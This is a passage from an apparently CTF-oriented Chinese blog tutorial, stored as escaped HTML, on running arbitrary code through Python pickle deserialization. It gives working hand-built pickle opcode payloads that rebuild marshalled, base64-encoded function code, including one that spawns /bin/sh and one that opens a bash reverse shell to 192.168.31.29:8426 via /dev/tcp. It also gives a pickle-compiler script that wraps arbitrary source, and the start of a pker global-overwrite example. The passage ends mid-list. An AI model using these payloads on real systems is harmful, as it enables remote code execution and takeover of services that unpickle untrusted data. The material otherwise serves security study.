&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">marshal&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">base64&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">foo&lt;/span>&lt;span style="color:#111">():&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">os&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">fib&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">n&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">n&lt;/span> &lt;span style="color:#f92672">&amp;lt;=&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">n&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">fib&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">n&lt;/span>&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">fib&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">n&lt;/span>&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">print&lt;/span> &lt;span style="color:#d88200">&amp;#39;fib(10) =&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">fib&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">10&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">os&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">system&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/bin/sh&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">code_serialized&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">base64&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">b64encode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">marshal&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">dumps&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">foo&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">func_code&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">print&lt;/span> &lt;span style="color:#111">code_serialized&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># YwAAAAABAAAAAgAAAAMAAABzOwAAAGQBAGQAAGwAAH0AAIcAAGYBAGQCAIYAAIkAAGQDAEeIAABkBACDAQBHSHwAAGoBAGQFAIMBAAFkAABTKAYAAABOaf////9jAQAAAAEAAAAEAAAAEwAAAHMsAAAAfAAAZAEAawEAchAAfAAAU4gAAHwAAGQBABiDAQCIAAB8AABkAgAYgwEAF1MoAwAAAE5pAQAAAGkCAAAAKAAAAAAoAQAAAHQBAAAAbigBAAAAdAMAAABmaWIoAAAAAHMFAAAAdTIucHlSAQAAAAUAAABzBgAAAAABDAEEAXMIAAAAZmliKDEwKT1pCgAAAHMHAAAAL2Jpbi9zaCgCAAAAdAIAAABvc3QGAAAAc3lzdGVtKAEAAABSAgAAACgAAAAAKAEAAABSAQAAAHMFAAAAdTIucHl0AwAAAGZvbwMAAABzCAAAAAABDAEPBA8B&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>现在得到了序列化的字符串，我们希望它被反序列化时执行，但是直接将他放入&lt;code>__reduce__&lt;/code>返回部分似乎并不可以，&lt;code>__reduce__&lt;/code>是调用callable来执行参数之类的，而我们构造好的本身就是callable，希望它执行而不是作为另一个callable的参数；这时就需要直接从PVM操作码的层级进行构造了。&lt;/p>
&lt;p>————其实我觉得更通俗的理解是这样可以不把要执行的代码限制在&lt;code>return (os.system,(a,))&lt;/code>这样式的框架中，而是可以自由的执行代码，或者说就是另一种形式的pker&lt;/p>
&lt;p>我们需要执行的其实是（利用到python oop的特性，通过&lt;code>types.FunctionTyle(func_code,globals(),’’)()&lt;/code>来动态地创建匿名函数，参见：&lt;a href="https://docs.python.org/zh-cn/3/library/types.html#module-types">官方文档&lt;/a>）&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">types&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">FunctionType&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">marshal&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">loads&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">base64&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">b64decode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">code_enc&lt;/span>&lt;span style="color:#111">)),&lt;/span> &lt;span style="color:#111">globals&lt;/span>&lt;span style="color:#111">(),&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>&lt;span style="color:#111">))()&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>或者更可读一些&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">code_str&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">base64&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">b64decode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">code_enc&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">code&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">marshal&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">loads&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">code_str&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">func&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">types&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">FunctionType&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">code&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">globals&lt;/span>&lt;span style="color:#111">(),&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">func&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>接下来就是手动构造opcode的时候了，回想之前返回一个简单的shell时的opcode&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">cos&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">system&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">S&lt;/span>&lt;span style="color:#d88200">&amp;#39;/bin/sh&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">tR&lt;/span>&lt;span style="color:#f92672">.&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>开头的c后面跟的是引入的模块，换行之后是函数，再换行之后是执行的语句；根据这个结构把marshal和b64加进去&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">cmarshal&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">loads&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">cbase64&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">b64decode&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">S&lt;/span>&lt;span style="color:#d88200">&amp;#39;YwAAAAAB........&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">tRtR&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>而globals()可以在&lt;code>__builtin__&lt;/code>模块中引入&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">{}{}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">c__builtin__&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">globals&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">tR&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>把上面的缝合起来得到最终的payload，注意添加&lt;code>(rR.&lt;/code>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">ctypes&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">FunctionType&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">cmarshal&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">loads&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">cbase64&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">b64decode&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">S&lt;/span>&lt;span style="color:#d88200">&amp;#39;YwAAAAAB........&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">tRtRc__builtin__&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">globals&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">tRS&lt;/span>&lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">tR&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">tR&lt;/span>&lt;span style="color:#f92672">.&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>构造这个人看着费劲的payload的模板~（来源参见：&lt;a href="https://checkoway.net/musings/pickle/">Arbitrary code execution with Python pickles&lt;/a>）&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># py2&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">marshal&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">base64&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">foo&lt;/span>&lt;span style="color:#111">():&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">pass&lt;/span> &lt;span style="color:#75715e"># Your code here&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">print&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&amp;#34;ctypes
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">FunctionType
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">(cmarshal
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">loads
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">(cbase64
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">b64decode
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">(S&amp;#39;&lt;/span>&lt;span style="color:#d88200">%s&lt;/span>&lt;span style="color:#d88200">&amp;#39;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">tRtRc__builtin__
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">globals
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">(tRS&amp;#39;&amp;#39;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">tR(tR.&amp;#34;&amp;#34;&amp;#34;&lt;/span> &lt;span style="color:#f92672">%&lt;/span> &lt;span style="color:#111">base64&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">b64encode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">marshal&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">dumps&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">foo&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">func_code&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>用pickle执行一下那串payload看看效果&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210809094819276.png" alt="image-20210809094819276">&lt;/p>
&lt;p>成功返回了斐波那契数列的结果和一个shell&lt;/p>
&lt;p>原理都是一样的，也可以用Marshal+b64的方式反弹shell（用模板生成opcode&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">marshal&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">base64&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">foo&lt;/span>&lt;span style="color:#111">():&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">os&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">a&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;bash -c &amp;#34;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.31.29/8426 0&amp;gt;&amp;amp;1&amp;#34;&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># print &amp;#39;hold on...&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">os&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">system&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">a&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">print&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&amp;#34;ctypes
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">FunctionType
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">(cmarshal
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">loads
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">(cbase64
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">b64decode
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">(S&amp;#39;&lt;/span>&lt;span style="color:#d88200">%s&lt;/span>&lt;span style="color:#d88200">&amp;#39;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">tRtRc__builtin__
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">globals
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">(tRS&amp;#39;&amp;#39;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">tR(tR.&amp;#34;&amp;#34;&amp;#34;&lt;/span> &lt;span style="color:#f92672">%&lt;/span> &lt;span style="color:#111">base64&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">b64encode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">marshal&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">dumps&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">foo&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">func_code&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210810015119794.png" alt="image-20210810015119794">&lt;/p>
&lt;p>————或者下面这个模板也可以达到上面的效果（执行代码 而不包含类和函数）（来源：&lt;a href="https://gist.github.com/freddyb/3360650#file-pickle_compiler-py">pickle_compiler.py&lt;/a>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">try&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">cPickle&lt;/span> &lt;span style="color:#00a8c8">as&lt;/span> &lt;span style="color:#111">pickle&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">except&lt;/span> &lt;span style="color:#75af00">ImportError&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">pickle&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">from&lt;/span> &lt;span style="color:#111">sys&lt;/span> &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">argv&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">picklecompiler&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">sourcefile&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">sourcecode&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">file&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">sourcefile&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">read&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#d88200">&amp;#34;c__builtin__&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">eval&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">(c__builtin__&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">compile&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">(&lt;/span>&lt;span style="color:#d88200">%s&lt;/span>&lt;span style="color:#d88200">S&amp;#39;&amp;lt;payload&amp;gt;&amp;#39;&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">S&amp;#39;exec&amp;#39;&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">tRtR.&amp;#34;&lt;/span> &lt;span style="color:#f92672">%&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">pickle&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">dumps&lt;/span>&lt;span style="color:#111">(&lt;/span> &lt;span style="color:#111">sourcecode&lt;/span> &lt;span style="color:#111">)[:&lt;/span>&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">4&lt;/span>&lt;span style="color:#111">],)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">usage&lt;/span>&lt;span style="color:#111">():&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">print&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;#39;&amp;#39;usage: python &lt;/span>&lt;span style="color:#d88200">%s&lt;/span>&lt;span style="color:#d88200"> filename&amp;#39;&amp;#39;&amp;#39;&lt;/span> &lt;span style="color:#f92672">%&lt;/span> &lt;span style="color:#111">argv&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">__name__&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#d88200">&amp;#34;__main__&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">len&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">argv&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">print&lt;/span> &lt;span style="color:#111">picklecompiler&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">argv&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">])&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">else&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">usage&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="工具二连---通过upkeruhttpsgithubcomeddieivan01pker构造opcode">工具二连 - 通过&lt;a href="https://github.com/eddieivan01/pker">&lt;u>pker&lt;/u>&lt;/a>构造opcode&lt;/h3>
&lt;p>原理参见：&lt;a href="https://xz.aliyun.com/t/7012#toc-5">通过AST来构造Pickle opcode - 自动化构造&lt;/a>，利用了抽象语法树&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210809232152276.png" alt="image-20210809232152276">&lt;/p>
&lt;p>pker会用到&lt;code>GLOBAL&lt;/code>, &lt;code>INST&lt;/code>, &lt;code>OBJ&lt;/code>这三种特殊函数和一些必要的转换方式；下面是pker的简单小栗子（更多使用说明详见上面的链接）&lt;/p>
&lt;ul>
&lt;li>
&lt;p>全局变量覆盖&lt;/p>
&lt;ul>
&lt;li>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># 覆盖直接由执行文件引入secret模块中的name和category模块&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">ecret&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">GLOBAL&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;__main__&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;secret&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">secret&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">name&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;1&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">secret&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">category&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;2&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
